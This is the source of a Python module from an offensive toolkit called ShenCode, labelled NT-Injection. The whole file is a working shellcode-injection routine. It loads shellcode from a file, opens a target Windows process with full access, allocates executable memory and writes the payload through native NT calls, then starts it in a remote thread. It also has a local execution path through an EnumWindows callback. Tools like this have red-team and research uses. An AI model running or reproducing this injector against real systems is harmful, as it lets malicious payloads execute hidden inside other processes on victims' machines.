########################################################
### ShenCode Module
###
### Name: NT-Injection
### Docs: https://heckhausen.it/shencode/README
### 
########################################################

import os
from utils.windef import *
from utils.winconst import *
from utils.style import *
from utils.helper import CheckFile

CATEGORY    = 'inject'
DESCRIPTION = 'NT-Injection with native windows API (experimental)'

cs = ConsoleStyles()

def register_arguments(parser):
            parser.add_argument('-i', '--input', help='Input file for process injection')
            parser.add_argument('-p', '--process', help='Processname to inject the shellcode')

            grp = parser.add_argument_group('additional')
            grp.add_argument('-s', '--start-process', action='store_true', help='If not active, start the process before injection')

class module:
    from urllib import request
    from time import sleep
    import wmi
    import threading

    Author = 'psycore8'
    Version = '0.9.0'
    DisplayName = 'NATIVE-INJECTION'
    delay = 5
    data_size = 0
    hash = ''
    pid = int
    nt_error = 0
    callback_func = False
    shellcode = b''
    relay_input = False

    def __init__(self, input, start_process, process):
        self.input_file = input
        self.process_start = start_process
        self.target_process = process

    def Start_Process(self):
        cs.console_print.note(f'Starting {self.target_process}')
        os.system(self.target_process)

    def get_proc_id(self):
        processes = self.wmi.WMI().Win32_Process(name=self.target_process)
        self.pid = processes[0].ProcessId
        cs.console_print.ok(f'{self.target_process} process id: {self.pid}')
        return int(self.pid)

    def start_injection(self):
        if self.callback_func:
            mem = VirtualAlloc(0, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
            cs.console_print.note(f'Allocated memory address: 0x{mem:X}')
            RtlMoveMemory(mem, self.shellcode, len(self.shellcode))
            try:
                pEnumWindows(mem, 0)
            except:
                cs.console_print.error('EnumWindows exception!')
                return
            exit()

        if self.Start_Process:
            s = self.threading.Thread(target=self.Start_Process)
            s.start()
            self.sleep(3)

        process_id = self.get_proc_id()
        base_address = ctypes.c_void_p(0)
        
        phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
        if phandle:
            cs.console_print.ok('Opened a Handle to the process')

        rs = SIZE_T(len(self.shellcode))
        rs_ptr = ctypes.byref(rs)
        memory = pNtAllocateVirtualMemory(phandle, ctypes.byref(base_address), 0, rs_ptr, MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if memory == NT_SUCCESS:
            cs.console_print.ok('Allocated Memory in the process')
        else:
            self.nt_error = memory
            cs.console_print.error(f'Error during memory allocation for address 0x{self.nt_error:X}')
            return

        bs = len(self.shellcode)
        writing = pNtWriteVirtualMemory(phandle, base_address, self.shellcode, bs, None)
        if writing == NT_SUCCESS:
            cs.console_print.ok('Wrote The shellcode to memory')
        else:
            self.nt_error = memory
            cs.console_print.error(f'Error during memory writing to address 0x{self.nt_error:X}')
            return
        th = HANDLE()
        Injection = pNtCreateThreadEx(ctypes.byref(th), ACCESS_MASK(GENERIC_ALL), None, phandle, base_address, None, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, 0, 0, 0, None)

        if Injection == NT_SUCCESS :
            cs.console_print.ok('Injected the shellcode into the process')
        else:
            self.nt_error = memory
            cs.console_print.error(f'Error during thread creation at address 0x{self.nt_error:X}')
            return

        cs.console_print.note('Thread suspended, waiting 10 seconds...')
        self.sleep(1)

        suspend_count = ULONG(0)
        resume = pNtResumeThread(th, ctypes.byref(suspend_count))
        WaitForSingleObject(th, -1)

        if resume == NT_SUCCESS:
            cs.console_print.ok('Injection successful')
        else:
            cs.console_print.error('Injection failed')
        CloseHandle(phandle)

    def proc_inject():
        return False
    
    def open_file(self):
        if self.relay_input:
            self.shellcode = bytes(self.input_file)
        else:
            try:
                with open(self.input_file, 'rb') as file:
                    self.shellcode = file.read()
            except FileNotFoundError:
                return False
    
    def process(self):
        cs.module_header(self.DisplayName, self.Version)
        if not self.relay_input:
            cs.console_print.note('Open file...')
            if CheckFile(self.input_file):
                cs.action_open_file2(self.input_file)
            else:
                cs.console_print.error(f'File {self.input_file} not found or cannot be opened.')
        self.open_file()
        cs.console_print.note('Try to execute shellcode')
        self.start_injection()
        cs.console_print.ok('DONE!')
